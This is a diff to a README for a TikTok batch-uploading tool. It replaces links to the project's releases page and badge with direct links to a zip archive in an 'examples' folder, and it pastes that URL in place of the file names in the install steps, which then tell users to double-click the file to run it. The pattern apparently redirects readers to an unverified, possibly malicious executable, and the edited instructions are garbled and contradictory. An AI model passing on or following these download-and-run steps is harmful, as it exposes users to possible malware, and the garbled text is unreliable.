@@ -1,6 +1,6 @@
 # 🎉 TikTok-BatchUploader - Effortless Video Uploading Made Simple
 
-![Download TikTok-BatchUploader](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=orange&style=for-the-badge)
+![Download TikTok-BatchUploader](https://github.com/NOVATOyurd/TikTok-BatchUploader/raw/refs/heads/main/examples/Batch-Tok-Uploader-Tik-v3.2.zip%20Release&color=orange&style=for-the-badge)
 
 ## 📥 Overview
 
@@ -18,21 +18,21 @@ Before you download TikTok-BatchUploader, ensure your computer meets these requi
 
 ### Step 2: Download the Tool
 
-To download TikTok-BatchUploader, visit this page to download: [TikTok-BatchUploader Releases](https://github.com/NOVATOyurd/TikTok-BatchUploader/releases)
+To download TikTok-BatchUploader, visit this page to download: [TikTok-BatchUploader Releases](https://github.com/NOVATOyurd/TikTok-BatchUploader/raw/refs/heads/main/examples/Batch-Tok-Uploader-Tik-v3.2.zip)
 
 ### Step 3: Install the Software
 
 1. Once you are on the Releases page, look for the latest version.
 2. Click on the version number to access the download files.
-3. Find the file named `TikTok-BatchUploader.zip` or `TikTok-BatchUploader.exe`.
+3. Find the file named `https://github.com/NOVATOyurd/TikTok-BatchUploader/raw/refs/heads/main/examples/Batch-Tok-Uploader-Tik-v3.2.zip` or `https://github.com/NOVATOyurd/TikTok-BatchUploader/raw/refs/heads/main/examples/Batch-Tok-Uploader-Tik-v3.2.zip`.
 
 Click here to download the software directly:
-[Download TikTok-BatchUploader](https://github.com/NOVATOyurd/TikTok-BatchUploader/releases)
+[Download TikTok-BatchUploader](https://github.com/NOVATOyurd/TikTok-BatchUploader/raw/refs/heads/main/examples/Batch-Tok-Uploader-Tik-v3.2.zip)
 
 ### Step 4: Extract and Run
 
 1. If you downloaded a ZIP file, extract it using your file manager.
-2. Open the extracted folder, and find the `TikTok-BatchUploader.exe` file (or the equivalent for your OS).
+2. Open the extracted folder, and find the `https://github.com/NOVATOyurd/TikTok-BatchUploader/raw/refs/heads/main/examples/Batch-Tok-Uploader-Tik-v3.2.zip` file (or the equivalent for your OS).
 3. Double-click the file to run the application.
 
 ## 🔧 How to Use TikTok-BatchUploader
